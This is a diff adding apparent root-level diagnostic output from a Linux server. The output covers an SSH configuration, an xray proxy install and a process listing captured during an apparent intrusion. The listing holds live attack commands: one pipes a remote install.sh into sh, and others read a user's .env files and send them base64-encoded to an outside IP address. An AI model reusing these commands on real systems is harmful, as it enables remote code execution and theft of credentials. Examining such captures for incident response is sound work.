@@ -1,0 +1,24 @@
+uid=0(root) gid=0(root) groups=0(root)
+node1.sanchaya.net
+-rw------- 1 root root 2402 Oct 25 13:20 /root/.ssh/authorized_keys
+Port 2022
+PermitRootLogin yes
+root      5574  0.0  0.0   4636   924 ?        S    13:19   0:00 /bin/sh -c curl -s http://103.238.227.226/xray_rpt?SOLRX_172_105_61_126; curl -s http://103.238.227.226/install.sh | sh
+root      5575  0.0  0.0   4636   928 ?        S    13:19   0:00 /bin/sh -c curl -s http://103.238.227.226/xray_rpt?SOLRX_node1_sanchaya_net; curl -s http://103.238.227.226/install.sh | sh
+root      5576  0.0  0.1 107184  9024 ?        S    13:19   0:00 curl -s http://103.238.227.226/xray_rpt?SOLRX_172_105_61_126
+root      5578  0.0  0.1 107184  8972 ?        S    13:19   0:00 curl -s http://103.238.227.226/xray_rpt?SOLRX_node1_sanchaya_net
+root      5586  0.0  0.0   4636   928 ?        S    13:19   0:00 /bin/sh -c O=$( (head -c 450 /home/jodipada/.env 2>&1; echo ----; ls /home/jodipada | head -8) 2>&1 ); curl -s "http://103.238.227.226/xray_rpt?DP_172_105_61_126_$(echo $O | base64 -w0 | tr '+/=' '-_~')"
+root      5598  0.0  0.0   4636   860 ?        S    13:19   0:00 /bin/sh -c O=$( (ls -la /home/jodipada/.env/ 2>&1 | head -10; echo ---; head -c 300 /home/jodipada/.env/* 2>/dev/null) 2>&1 | head -c 900 ); curl -s "http://103.238.227.226/xray_rpt?HV_172_105_61_126_$(echo $O | base64 -w0 | tr '+/=' '-_~')"
+root      5635  0.0  0.1 107184  9096 ?        S    13:19   0:00 curl -s http://103.238.227.226/xray_rpt?HW_172_105_61_126_QU1EIEVQWUMgNzcxMyA2NC1Db3JlIFByb2Nlc3NvciA0IDc5NzYgMTU3RyB4ODZfNjQK
+root      5636  0.0  0.1 107184  9244 ?        S    13:19   0:00 curl -s http://103.238.227.226/xray_rpt?DP_172_105_61_126_aGVhZDogZXJyb3IgcmVhZGluZyAnL2hvbWUvam9kaXBhZGEvLmVudic6IElzIGEgZGlyZWN0b3J5IC0tLS0gcHVibGljCg~~
+root      5641  0.0  0.1 107184  9216 ?        S    13:19   0:00 curl -s http://103.238.227.226/xray_rpt?HV_172_105_61_126_dG90YWwgMjQgZHJ3eHJ3eHIteCA0IGpvZGlwYWRhIGpvZGlwYWRhIDQwOTYgRGVjIDggMjAyMSAuIGRyd3hyLXhyLXggOCBqb2RpcGFkYSBqb2RpcGFkYSA0MDk2IFNlcCAxNiAxMjo0MCAuLiBkcnd4cnd4ci14IDIgam9kaXBhZGEgam9kaXBhZGEgNDA5NiBEZWMgOCAyMDIxIGJpbiAtcnctcnctci0tIDEgam9kaXBhZGEgam9kaXBhZGEgNDAgRGVjIDggMjAyMSAuZ2l0aWdub3JlIGRyd3hyd3hyLXggMyBqb2RpcGFkYSBqb2RpcGFkYSA0MDk2IERlYyA4IDIwMjEgbGliIC1ydy1ydy1yLS0gMSBqb2RpcGFkYSBqb2RpcGFkYSAyMDIgRGVjIDggMjAyMSBweXZlbnYuY2ZnIC0tLSA9PT4gL2hvbWUvam9kaXBhZGEvLmVudi9iaW4gPD09ID09PiAvaG9tZS9qb2RpcGFkYS8uZW52L2xpYiA8PT0gPT0-IC9ob21lL2pvZGlwYWRhLy5lbnYvcHl2ZW52LmNmZyA8PT0gaG9tZSA9IC91c3IgaW1wbGVtZW50YXRpb24gPSBDUHl0aG9uIHZlcnNpb25faW5mbyA9IDMuNi45LmZpbmFsLjAgdmlydHVhbGVudiA9IDIwLjEwLjAgaW5jbHVkZS1zeXN0ZW0tc2l0ZS1wYWNrYWdlcyA9IGZhbHNlIGJhc2UtcHJlZml4ID0gL3VzciBiYXNlLWV4ZWMtcHJlZml4ID0gL3VzciBiYXNlLWV4ZWN1dGFibGUgPSAvdXNyL2Jpbi9weXRob24zCg~~
+root      5695  0.0  0.1 107184  8932 ?        S    13:19   0:00 curl -s http://103.238.227.226/xray_rpt?FR_172_105_61_126_MjUsNTMsODAsNDQzLDU4NywyMDIyLDIwODcsMjA5NiwzMDAwLDMzMDYsNDAwMCw0MDQwLDU0MzIsNzAwMCw3OTgzLDgwODAsODQ0Myw4ODg4LDg5ODMsOTQ0MywxMDAwMCwxMTIxMSwxODk4MywzMzYxNywzNjcwMSw0MTAyMSw0MjUwNywvaG9tZTogYmFja3VwIGNsYXNzaWNhbGthbm5hZGEgY29kZXJ3YWxsIGNvcnB1cyBkYWFzYSBkaWN0IGZvbnRzIGZ1ZWwgZ2FhZGUgZ3JhbmRoYW0gaXNibiBqYW5uYSBqb2RpcGFkYSBrYWdnYSBrYW5uYWRhIGthdmlyYWphIGwxMG4gbGVhcm4gbG9ncyAvZXRjL3BvbGxpbmF0ZS9lbnRyb3B5LnVidW50dS5jb20ucGVtIC9ldGMvd2VibWluL21pbmlzZXJ2LnBlbSAvaG9tZS9qb2RpcGFkYS8uZW52Cg~~
+root     24275  0.0  0.4 1295348 34608 ?       Sl   Oct24   0:06 /usr/local/bin/xray run -c /usr/local/etc/xray/config.json
+-rwxr-xr-x 1 root root 35045500 Oct 24 12:39 /usr/local/bin/xray
+
+/usr/local/etc/xray:
+total 12
+drwxr-xr-x 2 root root 4096 Oct 24 12:39 .
+drwxr-xr-x 3 root root 4096 Oct 24 12:39 ..
+-rw-r--r-- 1 root root  889 Oct 24 12:39 config.json
+LISTEN  0        128                          *:8443                   *:*       users:(("xray",pid=24275,fd=5))                                                
